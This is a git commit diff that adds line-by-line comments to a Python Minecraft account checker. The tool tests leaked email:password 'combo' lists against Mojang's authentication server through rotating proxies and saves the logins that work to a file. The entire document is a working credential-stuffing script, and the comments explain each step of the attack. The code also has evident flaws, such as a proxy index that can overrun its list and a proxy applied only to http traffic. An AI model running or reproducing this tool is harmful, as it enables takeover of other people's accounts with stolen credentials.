d00c31eda3b3bfd9a108169213ec6cd33bf73571
MiyakoYakota <50219605+MiyakoYakota@users.noreply.github.com>
2019-05-02 18:03:15 -0400

    Added Comments
    It may be simple, but what kind of person would I be without comments?

--- MinePy.py
+++ MinePy.py
@@ -1,10 +1,10 @@
-import csv
-import requests
-import random
+import csv # For processing combos and proxies
+import requests # For making web requests
+import random # For choosing proxies at random
 
-working = []
+working = [] # Initialize the working accounts list
 
-headers = {
+headers = { # Set HTTP Headers
     'Host': 'authserver.mojang.com',
     'Connection': 'close',
     'Accept': 'application/json, text/plain, */*',
@@ -15,33 +15,31 @@ headers = {
     'Accept-Language': 'en-US,en;q=0.8',
 }
 
-requests.packages.urllib3.disable_warnings()
+requests.packages.urllib3.disable_warnings() # Disable annoying HTTPS Warnings, not really needed for this application.
 
-with open("combo.txt") as f:
-	reader = csv.reader(f, delimiter=':')
-	email, password = zip(*reader)
+with open("combo.txt") as f: # Open the file
+	reader = csv.reader(f, delimiter=':') # Define a csv reader session
+	email, password = zip(*reader) # Do the splitting into two lists, emails and passwords
 
-with open("proxies.txt") as f:
-	reader = csv.reader(f, delimiter=':')
-	IP, Port = zip(*reader)
+with open("proxies.txt") as f: # Open the file
+	reader = csv.reader(f, delimiter=':') # Define a csv reader session
+	IP, Port = zip(*reader) # Split the lines into two lists, IPs and Ports
 
 def checkAccount(accountNumber):
-    proxyNumber = random.randint(0,len(IP))
-    data = '{"agent":{"name":"Minecraft","version":1},"username":"' + email[accountNumber] +'","password":"' + password[accountNumber] + '"}'
-    response = requests.post('https://authserver.mojang.com/authenticate', proxies={"http": "http://" + IP[proxyNumber] + ":" + Port[proxyNumber]}, headers=headers, data=data, verify=False)
-    if any("accessToken" in s for s in response):
-		working.append(email[accountNumber] + ":" + password[accountNumber])
-		print(working)
-		with open('working.txt', 'w') as f:
-			for item in working:
-				f.write("%s\n" % item)
-    else:
-        print("Not working :(")
+    proxyNumber = random.randint(0,len(IP)) # Get a random proxy from the proxy list
+    data = '{"agent":{"name":"Minecraft","version":1},"username":"' + email[accountNumber] +'","password":"' + password[accountNumber] + '"}' # Set the data that will be sent to the auth servers to check
+    response = requests.post('https://authserver.mojang.com/authenticate', proxies={"http": "http://" + IP[proxyNumber] + ":" + Port[proxyNumber]}, headers=headers, data=data, verify=False) # Send the data and assign the response to the variable response
+    if any("accessToken" in s for s in response): # Check if the account is working.
+		working.append(email[accountNumber] + ":" + password[accountNumber]) # Add it to the working account list
+		print(working) # Write to STDOUT that it's working
+		with open('working.txt', 'w') as f: # Open working .txt
+			for item in working: # For every working account
+				f.write("%s\n" % item) # Write account
+    else: # It it's not working
+        print("Not working :(") # Say so
 
-
-
-for i in range(len(email)):
+for i in range(len(email)): # For every combo
     try:
-        checkAccount(i)
+        checkAccount(i) # Check it
     except:
-        pass
+        pass # Handle errors, like the proxy not working or if the request times out
